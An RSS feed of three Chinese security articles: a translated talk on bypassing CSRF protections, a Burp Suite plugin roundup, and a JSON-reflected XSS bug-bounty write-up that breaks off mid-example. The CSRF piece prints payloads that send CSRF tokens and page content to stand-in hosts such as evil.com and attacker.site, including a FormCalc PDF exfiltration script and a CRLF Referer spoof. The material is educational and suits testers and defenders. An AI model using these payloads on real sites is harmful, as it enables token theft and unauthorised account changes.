<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0" xmlns:media="http://search.yahoo.com/mrss/">
<channel>
<title>Twosecurity</title>
<link>https://henix.github.io/feeds/zhuanlan.twosecurity/</link>
<description>twosecurity.io</description>
<language>zh-cn</language>
<lastBuildDate>Thu, 11 Jan 2018 10:51:25 +0800</lastBuildDate>
<item>
<title>Neat tricks to bypass CSRF-protection</title>
<link>https://henix.github.io/feeds/zhuanlan.twosecurity/2018-01-07-32716181.htm</link>
<description>&lt;meta charset=&quot;utf-8&quot;&gt;
&lt;title&gt;Neat tricks to bypass CSRF-protection&lt;/title&gt;
&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/32716181&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-51734b036d371daf149f026fefa03126_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;h2&gt;&lt;b&gt;概述 &lt;/b&gt;&lt;/h2&gt;&lt;p&gt;在 2017 年的 OWASP （开放应用程序安全策略）Top 10 中，CSRF 漏洞排名&lt;a href=&quot;http://www.freebuf.com/news/131778.html&quot;&gt;第八&lt;/a&gt;，Bugcrowd 的漏洞评级分类中也把 CSRF 漏洞划为 &lt;a href=&quot;https://bugcrowd.com/vulnerability-rating-taxonomy&quot;&gt;P2 （高危）等级&lt;/a&gt;。为什么 CSRF 如此频繁发生呢？&lt;/p&gt;&lt;p&gt;可能有如下几个原因： &lt;/p&gt;&lt;ol&gt;&lt;li&gt;大多数的 web 应用仍然采用 cookie 来进行会话管理；&lt;/li&gt;&lt;li&gt;cookie 的&lt;a href=&quot;https://www.anquanke.com/post/id/83773&quot;&gt;SameSite&lt;/a&gt; 属性也没有得到广泛的应用，目前只有 Chrome 和 Opera 浏览器支持这种用法，并且在服务端还需要做一些修改 ；&lt;/li&gt;&lt;li&gt;大多数 CSRF 防护措施都是可以绕过的。&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;这篇文章先介绍 CSRF 的一些绕过手法，然后介绍一个 burpsuite 中的自动化插件 EasyCSRF，以帮我们完成繁杂的手动检测工作。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;常见的 CSRF 防护措施 &lt;/b&gt;&lt;/h2&gt;&lt;p&gt;CSRF攻击，简单地说，是攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己曾经认证过的网站并执行一些操作（如发邮件、发消息、甚至财产操作如转账和购买商品）。由于浏览器曾经认证过，所以被访问的网站会认为是真正的用户操作而去执行。这利用了web中用户身份验证的一个漏洞：简单的身份验证只能保证请求发自某个用户的浏览器，却不能保证请求本身是用户自愿发出的。 &lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;b&gt;CSRF-token &lt;/b&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;在 HTTP 请求中以参数的形式加入一个随机产生的 token，并在服务器端建立一个拦截器来验证这个 token，如果请求中没有 token 或者 token 内容不正确，则认为可能是 CSRF 攻击而拒绝该请求。&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;b&gt;cookie双重提交(验证cookie内容)&lt;/b&gt; &lt;/li&gt;&lt;/ul&gt;&lt;p&gt;除了请求中发送的本地 cookie，额外再要求提交一次 cookie，如果无法提供 cookie 内容并通不过验证，则认为可能是 CSRF 攻击而拒绝该请求。 &lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;b&gt;Content-Type验证&lt;/b&gt; &lt;/li&gt;&lt;li&gt;&lt;b&gt;Referer验证（验证请求来源)&lt;/b&gt; &lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Http 协议头中的 Referer 主要用来让服务器判断来源页面, 即用户是从哪个页面来的,通常被网站用来统计用户来源,是从搜索页面来的、还是从其他网站链接过来、或是从书签等访问,以便网站合理定位. &lt;/p&gt;&lt;p&gt;Referer 有时也被用作防盗链, 即下载时判断来源地址是不是在网站域名之内, 否则就不能下载或显示。很多网站,如天涯就是通过 Referer 页面来判断用户是否能够下载图片，如果 referer 指向的页面来源不是同一网站，则认为可能是 CSRF 攻击而拒绝该请求 。&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;b&gt;口令确认&lt;/b&gt; &lt;/li&gt;&lt;/ul&gt;&lt;p&gt;无法使用cookie直接验证身份，必须还要输入正确的密码口令才可以通过验证。 &lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;b&gt;Samesite&lt;/b&gt; &lt;b&gt;cookies（目前只有chrome和&lt;/b&gt; &lt;b&gt;Opera采用了此属性）&lt;/b&gt; &lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Samesite Cookie 是 Set-Cookie 响应头新增的属性，它用来标明这个 cookie 是个”同站 cookie”，同站 cookie 只能作为第一方 cookie，不能作为第三方 cookie。SameSite 有两个属性值，分别是 Strict 和 Lax，下面分别讲解： &lt;/p&gt;&lt;p&gt;&lt;b&gt;SameSite=Strict： &lt;/b&gt;&lt;/p&gt;&lt;p&gt;严格模式，表明这个 cookie 在任何情况下都不可能作为第三方 cookie，绝无例外。比如说假如 b.com 设置了如下 cookie： &lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;Set-Cookie: foo=1; SameSite=Strict  
Set-Cookie: bar=2 &lt;/code&gt;&lt;p&gt;你在 a.com 下发起的对 b.com 的任意请求中，foo 这个 cookie 都不会被包含在 Cookie 请求头中，但 bar 会。举个实际的例子就是，假如淘宝网站用来识别用户登录与否的 cookie 被设置成了 SameSite=Strict，那么用户从百度搜索页面甚至天猫页面的链接点击进入淘宝后，淘宝都不会是登录状态，因为淘宝的服务器不会接受到那个 cookie，其它网站发起的对淘宝的任意请求都不会带上那个 cookie。 &lt;/p&gt;&lt;p&gt;&lt;b&gt;SameSite=Lax： &lt;/b&gt;&lt;/p&gt;&lt;p&gt;宽松模式，比 Strict 放宽了点限制：假如这个请求是我上面总结的那种同步请求（改变了当前页面或者打开了新页面）且同时是个 GET 请求（因为从语义上说 GET 是读取操作，比 POST 更安全），则这个 cookie 可以作为第三方 cookie。比如说假如 b.com 设置了如下 cookie： &lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;Set-Cookie: foo=1; SameSite=Strict  
Set-Cookie: bar=2; SameSite=Lax  
Set-Cookie: baz=3 &lt;/code&gt;&lt;p&gt;当用户从 a.com 点击链接进入 b.com 时，foo 这个 cookie 不会被包含在 Cookie 请求头中，但 bar 和 baz 会，也就是说用户在不同网站之间通过链接跳转是不受影响了。但假如这个请求是从 a.com 发起的对 b.com 的异步请求，或者页面跳转是通过表单的 post 提交触发的，则 bar 也不会发送。 &lt;/p&gt;&lt;p&gt;可以参考这篇&lt;a href=&quot;http://www.cnblogs.com/ziyunfei/p/5637945.html&quot;&gt;文章&lt;/a&gt;。 &lt;/p&gt;&lt;p&gt;&lt;b&gt;CSRF 的绕过 &lt;/b&gt;&lt;/p&gt;&lt;p&gt;CSRF 绕过方法大致有如下几种： &lt;/p&gt;&lt;ol&gt;&lt;li&gt;跨站脚本攻击 &lt;/li&gt;&lt;li&gt;HTML标签注入(&lt;a href=&quot;http://lcamtuf.coredump.cx/postxss/&quot;&gt;Dangling markup&lt;/a&gt;) &lt;/li&gt;&lt;li&gt;子域绕过 &lt;/li&gt;&lt;li&gt;Cookie注入 &lt;/li&gt;&lt;li&gt;改变Content-Type &lt;/li&gt;&lt;li&gt;复杂的Content-Type(Non-simple Content-Type) &lt;/li&gt;&lt;li&gt;PDF插件(Bad Pdf) &lt;/li&gt;&lt;li&gt;Referer伪造(Referer spoof) &lt;/li&gt;&lt;/ol&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-335356a31ee6c19813241a0ae47e4549_r.jpg&quot; data-caption=&quot;CSRF防护有效绕过 &quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1277&quot; data-rawheight=&quot;554&quot;&gt;&lt;p&gt;接下来分别介绍它们： &lt;/p&gt;&lt;p&gt;&lt;b&gt;XSS绕过 &lt;/b&gt;&lt;/p&gt;&lt;p&gt;XSS 可以绕过 Web 系统和应用中大部分的防护，比如通过 XSS 来盗取用户的 Cookie，以此来伪装成真实用户达到 CSRF 攻击的目的。 &lt;/p&gt;&lt;p&gt;&lt;b&gt;HTML标签注入&lt;/b&gt; &lt;/p&gt;&lt;p&gt;由于 CSP——内容安全策略等限制，在 web 系统和应用中不能进行 XSS 而只能通过 HTML注入.借此攻击者可以获取到 CSRF-token 的内容 &lt;/p&gt;&lt;code lang=&quot;html&quot;&gt;&amp;lt;img src=”http://evil.com/log_csrf?html=”&amp;gt; 
&amp;lt;form action=”http://evil.com/log_csrf”&amp;gt;&amp;lt;textarea&amp;gt; &lt;/code&gt;&lt;p&gt;&lt;b&gt;子域绕过&lt;/b&gt; &lt;/p&gt;&lt;p&gt;（1）如果子域(例如: foo.example.com)能够轻易被 XSS 攻击、子域劫持或者 cookie 注入，那么攻击者可以轻易绕过 CSRF-token 验证、cookie 双重提交验证和 Content-Type 验证。 &lt;/p&gt;&lt;p&gt;（2）Web系统和应用采取CORS(跨域资源共享)来与子域通信时，相关的响应如下: &lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;Access-Control-Allow-Origin:https://foo.example.com   
 Access-Control-Allow-Credentials:True;                     &lt;/code&gt;&lt;p&gt;攻击者可以通过子域读取到主域 CSRF-token 的内容. &lt;/p&gt;&lt;p&gt;（3）子域(foo.example.com)存在XSS漏洞，主域包含文件crossdomain.xml: &lt;/p&gt;&lt;code lang=&quot;xml&quot;&gt;&amp;lt;cross-domain-policy&amp;gt; 
&amp;lt;allow-access-from-domain=”*.example.com” /&amp;gt;  //允许所有的子域跨域访问 
&amp;lt;/cross-domain-policy&amp;gt; &lt;/code&gt;&lt;p&gt;攻击者可以上传 JS 文件到 foo.example.com，然后利用 &lt;a href=&quot;http://foo.example.com/&quot;&gt;foo.example.com&lt;/a&gt; 的 Service Worker 通过 Flash 读取 CSRF-token 内容： &lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;Var url=“http：//attacker.Com/bad.swf”; 
Onfetch=(e)=&amp;gt;{                  //FetchEvent API 
 e.respondWith(fetch(url));     //respondWith方法包裹访问URL返回的响应代码 
} &lt;/code&gt;&lt;p&gt;如: Amazon 的 CSRF-token 绕过 (&lt;a href=&quot;https://ahussam.me/Amazon-leaking-csrf-token-using-service-worker/&quot;&gt;https://ahussam.me/Amazon-leaking-csrf-token-using-service-worker/&lt;/a&gt;) &lt;/p&gt;&lt;p&gt;（4）攻击者可以向父域或者任意目标路径注入 cookie，浏览器会选择路径明确的 cookie，也就是我们注入的 cookie，这可以用来绕过 cookie 双重提交验证 &lt;/p&gt;&lt;p&gt;&lt;b&gt;PDF插件绕过&lt;/b&gt; &lt;/p&gt;&lt;p&gt;Adobe 的 PDF 插件(在线 PDF 文件查看)支持 FormCalc 脚本语言，目前被 IE11 和 Firefox ESR 支持。而 Form 的 Get 和 post 方法可能泄露 CSRF-token。 &lt;/p&gt;&lt;p&gt;假设攻击者可以上传 PDF 文件到 &lt;a href=&quot;http://example.com/&quot;&gt;example.com&lt;/a&gt; 站点，被上传的文件能被目标网站example.com的 api 所解析，不过这里要注意的是，最好以别的形式上传文件，比如图片等等。另外，PDF 插件是不会关心 Content-Type 或  Content-Disposition 头的，大胆尝试各种姿势吧。 &lt;/p&gt;&lt;p&gt;看如下一个例子： &lt;/p&gt;&lt;p&gt;&lt;b&gt;Leak.pdf&lt;/b&gt; &lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-3f3ce4665508d507191722724de443bf_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;480&quot; data-rawheight=&quot;384&quot;&gt;&lt;code lang=&quot;html&quot;&gt;&amp;lt;script contentType=”application/x-formcalc”&amp;gt;          
         Var content=GET(“https://example.com/Settings.action”);   
         Post(“http://attacker.site/loot”,content,”text/plain”); 
&amp;lt;/script&amp;gt; &lt;/code&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-b3ca402fd4abd81d3ac803e38a7742cb_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;485&quot; data-rawheight=&quot;121&quot;&gt;&lt;p&gt;&lt;b&gt;Cookie注入绕过&lt;/b&gt; &lt;/p&gt;&lt;p&gt;攻击者可以通过Cookie注入绕过cookie双重提交验证 &lt;/p&gt;&lt;p&gt;    几种Cookie注入: &lt;/p&gt;&lt;p&gt;1.CRLF 注入 &lt;/p&gt;&lt;p&gt;攻击者可以通过在一段数据中加入CRLF命令来改变接受这个数据的应用程序处理这个数据的方式 &lt;/p&gt;&lt;p&gt;2.浏览器漏洞利用(如火狐的 CVE-2016-9078） &lt;/p&gt;&lt;p&gt;3.等等。。  &lt;/p&gt;&lt;p&gt;&lt;b&gt;Content-Type伪造绕过&lt;/b&gt; &lt;/p&gt;&lt;p&gt;开发者认为非标准格式的数据就可以有效的阻止CSRF, 但有时后端并不会检测  Content-Type头  &lt;/p&gt;&lt;p&gt;比如， 借助PDF插件来修改 Content-Type，从而通过验证 &lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-981e388b7081de702fb3240dd611306a_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;483&quot; data-rawheight=&quot;148&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-d9b354bbe9f7e25816264e6614633785_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;483&quot; data-rawheight=&quot;204&quot;&gt;&lt;p&gt;&lt;b&gt;任意Content-Type绕过:&lt;/b&gt; &lt;/p&gt;&lt;p&gt;攻击者通过 HTML 表单或者 XHR(XMLHttpReques) API 攻击者只能发送一些简单的Content_type: &lt;/p&gt;&lt;p&gt;如： &lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;Text/plain 
application/x-www-form-urlencoded 
multipart/form-data &lt;/code&gt;&lt;p&gt;那要怎么去发送任意的 Content-Type 头呢: &lt;/p&gt;&lt;p&gt;1、浏览器漏洞 (Chrome 的 navigator.sendBeacon 方法)  &lt;/p&gt;&lt;p&gt;2、Flash 插件 和 307 临时重定向  &lt;/p&gt;&lt;p&gt;3、PDF 插件和 307 临时重定向  &lt;/p&gt;&lt;p&gt;4、一些后端框架支持 URL 参数重定义 Content-Type 的, &lt;a href=&quot;http://cxf.apache.org/docs/jax-rs.html#JAX-RS-Debugging&quot;&gt;http://cxf.apache.org/docs/jax-rs.html#JAX-RS-Debugging&lt;/a&gt; &lt;/p&gt;&lt;p&gt;&lt;a href=&quot;http://xn--chrome:-bu3kgmm36rd7pnkf871a174f/&quot;&gt;这是Chrome的一个漏洞：&lt;/a&gt;&lt;b&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/32716181/h%3C/b%3Ettps://bugs.chromium.org/p/chromium/issues/detail?id=490015&quot;&gt;Chrome Bug &lt;/a&gt; ，最近两年很常见 ，Nabigator.sendBeacon()方法支持以任意content-Type发送POST请求 &lt;/b&gt;&lt;/p&gt;&lt;p&gt;如下： &lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-42e3d0f56da562ef9985fcb02c417162_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;493&quot; data-rawheight=&quot;180&quot;&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-9458a21d33283e9b4892e72b9221ffad_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;513&quot; data-rawheight=&quot;255&quot;&gt;&lt;p&gt;&lt;b&gt;Referer伪造绕过&lt;/b&gt; &lt;/p&gt;&lt;p&gt;MS Edge的&lt;a href=&quot;https://www.brokenbrowser.com/referer-spoofing-patch-bypass/&quot;&gt;漏洞&lt;/a&gt; ,此漏洞依然可以利用但是仅限于get请求,而有的后端程序不区分GET和POST请求，那就可以大胆去尝试了。  &lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-a6f3e9e07e77bbf2a484306f175ad53c_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;499&quot; data-rawheight=&quot;269&quot;&gt;&lt;code lang=&quot;html&quot;&gt;&amp;lt;script contentType=&#39;application/x-formcalc&#39;&amp;gt; 
Post(&quot;http://attacker.com:8888/redirect&quot;, 
&quot;{&quot;&quot;action&quot;&quot;:&quot;&quot;add-user-email&quot;&quot;,&quot;&quot;Email&quot;&quot;:&quot;&quot;attacker@evil.com&quot;&quot;}&quot;, &quot;application/json&amp;amp;#x0a;&amp;amp;#x0d;Referer;&amp;amp;#x20;http://example.com&quot;)  
&amp;lt;/script&amp;gt; &lt;/code&gt;&lt;p&gt;PDF 插件发送 HTTP头 &lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;Referer http://example.com 
 Name:Value &lt;/code&gt;&lt;p&gt;一些后台(Jboss/WildFly等)会将空格当作冒号(HTTP头的末尾) &lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;Referer http://example.com 
 Name:Value &lt;/code&gt;&lt;p&gt;漏洞挖掘者可以从这几方面入手： &lt;/p&gt;&lt;p&gt;1有许多的API都存在基于 Content-Type的CSRF防护 &lt;/p&gt;&lt;p&gt;2 检查子域是否存在漏洞(XSS,子域名接管，cookie注入) &lt;/p&gt;&lt;p&gt;3  PDF上传的技巧有时也可以试试 &lt;/p&gt;&lt;p&gt;4 将带有CSRF-token的url编码 body转换成没有CSRF-token的JSON格式 &lt;/p&gt;&lt;p&gt;&lt;b&gt;Burp 中的 EasyCSRF 扩展&lt;/b&gt; &lt;/p&gt;&lt;p&gt;EasyCSRF 在 BurpSuite 的免费版中就可以使用 &lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/0ang3el/EasyCSRF&quot;&gt;下载地址&lt;/a&gt; &lt;/p&gt;&lt;p&gt;EasyCSRF 作为代理监听请求 (IProxyListener): &lt;/p&gt;&lt;ul&gt;&lt;li&gt;不停修改请求 (移除CSRF参数/头，改变请求方法等） &lt;/li&gt;&lt;li&gt;高亮显示已修改的请求 &lt;/li&gt;&lt;li&gt;可以直观的看到修改的请求是否执行成&lt;/li&gt;&lt;/ul&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-f4fd2d5e708a8757c3a924cfbe30e028_r.jpg&quot; data-caption=&quot;主界面&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;507&quot; data-rawheight=&quot;319&quot;&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-55ec299974251d04bf850dfe6b3007e8_r.jpg&quot; data-caption=&quot;修改前&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;507&quot; data-rawheight=&quot;276&quot;&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-67315d650b33e8b4c9da19c2563b8d29_r.jpg&quot; data-caption=&quot;修改后&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;511&quot; data-rawheight=&quot;268&quot;&gt;&lt;p&gt;可以看到 EasyCSRF 把 PUT 方法改成了 POST 方法, 移除了 Origin 头，并在历史 url 中高亮请求 。&lt;/p&gt;&lt;p&gt;原文：&lt;a href=&quot;https://www.slideshare.net/0ang3el/neat-tricks-to-bypass-csrfprotection&quot;&gt;https://www.slideshare.net/0ang3el/neat-tricks-to-bypass-csrfprotection&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;</description>
<author>Twosecurity</author>
<guid isPermaLink="false">2018-01-07-32716181</guid>
<pubDate>Sun, 07 Jan 2018 00:00:00 +0800</pubDate>
</item>
<item>
<title>Worthwhile BurpSuite Plugins</title>
<link>https://henix.github.io/feeds/zhuanlan.twosecurity/2017-12-28-32419599.htm</link>
<description>&lt;meta charset=&quot;utf-8&quot;&gt;
&lt;title&gt;Worthwhile BurpSuite Plugins&lt;/title&gt;
&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/32419599&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-4baf533ed0a7c1e78c35ac2eb05934ab_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;提到 BurpSute 插件你或许有一些误解，本文主要讲功能性插件和安全插件。 &lt;/p&gt;&lt;h2&gt;&lt;b&gt;概述 &lt;/b&gt;&lt;/h2&gt;&lt;p&gt;BurpSute 是一款安全人员常用的工具，本文不是讨论它与其它工具（如 OWASP ZAP）的优劣，而是关于其插件的的探讨，本文提到的所有插件都不按名排序。 &lt;/p&gt;&lt;h2&gt;&lt;b&gt;插件 &lt;/b&gt;&lt;/h2&gt;&lt;p&gt;&lt;b&gt;功能性插件 &lt;/b&gt;&lt;/p&gt;&lt;p&gt;这里所说的功能不是自动的为你查找漏洞，而是可以在某些方面为你节省时间。 &lt;/p&gt;&lt;ol&gt;&lt;li&gt;&lt;b&gt;JSON&lt;/b&gt; &lt;b&gt;Beautifie&lt;/b&gt;      这个是必须添加的，或者随着时间点的推移，BurpSute 官方也会加上这个插件。检测到的任何 JSON 请求都会被正确的格式化，这将为你节省大量的时间。 &lt;/li&gt;&lt;li&gt;&lt;b&gt;Content Type Converter&lt;/b&gt;      方便你在不同的 Content-type 之间转换。我通常用来转换为 XML 格式，这样可以节省不少精力。这个插件适合用来寻找 &lt;a href=&quot;https://blog.netspi.com/playing-content-type-xxe-json-endpoints/&quot;&gt;JSON 端的 XXE 漏洞&lt;/a&gt; ，我遇见的多数情况下都是 JSON 格式的。 &lt;/li&gt;&lt;li&gt;&lt;b&gt;Copy As Python-Requests (possibly other ‘Copy As’ plugins)    &lt;/b&gt; 对于习惯使用Python 的人来说这款插件用着是十分舒心的。右键单击请求部分就能将其转换为Python 格式，通常没有把它用在查找安全问题上，而是用在开发过程中调试和解决问题。 &lt;/li&gt;&lt;li&gt;&lt;b&gt;&lt;a href=&quot;https://github.com/bugcrowd/HUNT&quot;&gt;HUNT&lt;/a&gt;&lt;/b&gt;     由 Bugcrowd 上的人创建的一个插件，是一个代理扩展，主要用来识别一些容易存在漏洞的参数，非常有利于平时的工作。我通常关于这个插件的最好的事情是可以添加与特定环境相关的信息。也许你有工作具体的利用或链，你必须检查。将这些信息轻松传递给新雇员不是很好吗？把它添加到这个插件，并有一个可以复制的方法。 &lt;/li&gt;&lt;li&gt;&lt;b&gt;Metadata&lt;/b&gt;     metadata,即元数据，描述数据的数据，对数据及信息资源的描述性信息。现在 PDF Metadata 和 Image Metadata 是很有用的，但是手动地去做一些核对工作又很痛苦。这个问题虽然没有前面的那些问题那么严重，但是也值得一提。 &lt;/li&gt;&lt;/ol&gt;&lt;p&gt;&lt;b&gt;查找 Bug 的插件 &lt;/b&gt;&lt;/p&gt;&lt;p&gt;大家都想找到一些漏洞，但是有哪些插件可以做到呢？ &lt;/p&gt;&lt;ol&gt;&lt;li&gt;&lt;b&gt;&lt;a href=&quot;https://github.com/albinowax&quot;&gt;Literally anything by James Kettle&lt;/a&gt;  &lt;/b&gt;    James Kettle，在PortSwigger 工作，发表过许多最新的研究，代码编写能力很强。这里不得不提到插件是  backslash-powered-scanner 和 ActiveScan++。值得注意的是，在使用之前要仔细研读一下他的相关文章，不然可能很难用好这些工具。 &lt;/li&gt;&lt;li&gt;&lt;b&gt;Reflected Parameters&lt;/b&gt;     出于个人原因，我认为这个插件不太好用。这个插件会 dump 大量信息到 tab 标签中去，之后手动地去解析，因为代码或逻都很相似，所以这个过程可能有些枯燥乏味。响应当中那些未被修改过的参数可能就是存在漏洞的地方，这个插件很适合用来查找 XSS 和 CSRF 型的漏洞。 &lt;/li&gt;&lt;li&gt;&lt;b&gt;Cloud Storage Tester&lt;/b&gt;    非常棒的一款插件，并且 有许多检测的功能。能够读取有关指向不同云服务（Amazon，Microsoft，Google）的链接的响应，并对这些对象执行一些安全性检查。虽然现在有不少工具都可以完成 S3（Amazon Simple Storage Service 亚马逊简易存储服务）的工作，但我宁愿添加这个插件，而不是手动地去使用别的工具。 &lt;/li&gt;&lt;li&gt;&lt;b&gt;Retire.js&lt;/b&gt;    这款软件会定期更新，包含一些正在使用的框架的信息。但是也会产生一些问题，这些问题有些是没有帮助或是无法利用的。&lt;/li&gt;&lt;/ol&gt;&lt;h2&gt;&lt;b&gt;思考 &lt;/b&gt;&lt;/h2&gt;&lt;p&gt;正如你看到的，我更倾向于可以提高工作效率的“功能”性插件。那些安全插件存在的一个问题就是，你不知道它们工作的机理是怎么样的，无法完全相信其输出结果，或许还要手动去检查。当然也可以自己去阅读源代码，可是通常源代码也写的一团糟，这个时候 可能还不如自己去手动检测呢。 &lt;/p&gt;&lt;p&gt;我相信，受益最多的不是 BApp 里面的那些插件，而是为自己量身打造的那些插件。花时间来自己编写这些插件将会节省大量的时间。 &lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;参考：&lt;a href=&quot;http://offsecbyautomation.com/Worthwhile-BurpSuite-Plugins/&quot;&gt;http://offsecbyautomation.com/Worthwhile-BurpSuite-Plugins/&lt;/a&gt; &lt;/p&gt;</description>
<author>Twosecurity</author>
<guid isPermaLink="false">2017-12-28-32419599</guid>
<pubDate>Thu, 28 Dec 2017 00:00:00 +0800</pubDate>
</item>
<item>
<title>Story of a JSON XSS</title>
<link>https://henix.github.io/feeds/zhuanlan.twosecurity/2017-12-22-32253101.htm</link>
<description>&lt;meta charset=&quot;utf-8&quot;&gt;
&lt;title&gt;Story of a JSON XSS&lt;/title&gt;
&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/32253101&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-aa7239a8d0b4125cdc52a4c4283d2933_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;嗨，伙计们， &lt;/p&gt;&lt;p&gt;这篇文章记录了我最近在漏洞悬赏项目中发现的一个问题。刚开始我测试了一遍常见的漏洞，但一无所获。过了一个小时我发现了一个问题： &lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-399b5b45b7b9c2695269fa40ddff92af_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1365&quot; data-rawheight=&quot;362&quot;&gt;&lt;p&gt;如下是数据包的请求和响应部分：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;request:
process=activate_newsletter&amp;amp;status=0&amp;amp;usid=xxx

response:
{&quot;success&quot;:true,&quot;status&quot;:&quot;0&quot;}&lt;/code&gt;&lt;p&gt;查看 request 和 response 响应，你会看到 status 参数的值出现在了 response 响应当中。因此，我试着改变 status 参数的值，它也返回到了 response 响应中： &lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-7747aad17777d0c66de7391c62f5d82d_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1358&quot; data-rawheight=&quot;343&quot;&gt;&lt;code lang=&quot;text&quot;&gt;request:
process=activate_newsletter&amp;amp;status=test&amp;amp;usid=xxx

response:
{&quot;success&quot;:true,&quot;status&quot;:&quot;test&quot;}&lt;/code&gt;&lt;p&gt;接下来呢？我们来试试简单的 XSS payload ： &lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-dfc9b16a919731d2227e14bbdcf1c279_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1365&quot; data-rawheight=&quot;379&quot;&gt;&lt;code lang=&quot;text&quot;&gt;request:
process=activate_newsletter&amp;amp;status=test&amp;lt;haha&amp;gt;&amp;amp;usid=xxx

response:
{&quot;success&quot;:true,&quot;status&quot;:&quot;test&amp;amp;lt;haha&amp;amp;ggt;&quot;}&lt;/code&gt;&lt;p&gt;但是尖括号被过滤了，我试了一些编码方式但是也没有绕过。正当我想放弃时，突然想起可以传入数组试试： &lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-86b775fa385d64c616f8bf51c90b366d_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1342&quot; data-rawheight=&quot;350&quot;&gt;&lt;code lang=&quot;text&quot;&gt;request:
process=activate_newsletter&amp;amp;status=[testarray]&amp;amp;usid=xxx

response:
{&quot;success&quot;:true,&quot;status&quot;:{&quot;testarray&quot;:&quot;test&quot;}}&lt;/code&gt;&lt;p&gt;你可以看到我们写在圆括号里面的东西都被输出到了响应里，因为它变成了如下的关联数组： &lt;/p&gt;&lt;blockquote&gt;Status 参数相当于 JSON 对象 &lt;br&gt;&amp;lt;haha&amp;gt; 相当于 JSON 对象的索引 &lt;br&gt;Test 相当于 JSON 对象的值 &lt;/blockquote&gt;&lt;p&gt;再用简单的 XSS payload 来测试一下 &lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-e7aac74e22a9f95bafef463ed14d38c1_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1365&quot; data-rawheight=&quot;353&quot;&gt;&lt;code lang=&quot;text&quot;&gt;request:
process=activate_newsletter&amp;amp;status[&amp;lt;haha&amp;gt;]=test&amp;amp;usid=xxx

response:
